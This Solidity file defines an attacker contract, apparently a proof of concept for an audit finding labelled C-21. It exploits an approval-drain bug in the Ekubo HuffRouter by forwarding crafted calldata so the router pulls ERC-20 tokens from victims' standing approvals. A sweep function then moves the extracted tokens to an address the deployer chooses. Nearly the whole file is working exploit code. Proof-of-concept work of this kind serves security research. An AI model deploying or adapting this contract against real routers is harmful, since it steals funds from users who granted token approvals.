// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

/// @title EkuboAttacker
/// @notice Minimal, unprivileged attacker contract for the Ekubo HuffRouter
///         approval-drain bug (C-21). It holds no privileges, no special roles
///         and needs no capital: it simply forwards attacker-crafted calldata
///         to a vulnerable router. The router then pulls ERC-20 tokens from the
///         victim named in the appended calldata (spending the victim's
///         standing approval) and Ekubo Core pays the proceeds to this contract.
contract EkuboAttacker {
    address public immutable deployer;

    constructor() {
        deployer = msg.sender;
    }

    /// @notice Call a vulnerable router with attacker-supplied calldata.
    function attack(address router, bytes calldata data) external returns (bool ok, bytes memory ret) {
        require(msg.sender == deployer, "only deployer");
        (ok, ret) = router.call(data);
    }

    /// @notice Move an extracted token out of this contract (proof of ownership).
    function sweep(address token, address to) external {
        require(msg.sender == deployer, "only deployer");
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, IERC20Min(token).balanceOf(address(this)))
        );
        require(ok, string(ret));
    }

    receive() external payable {}
}
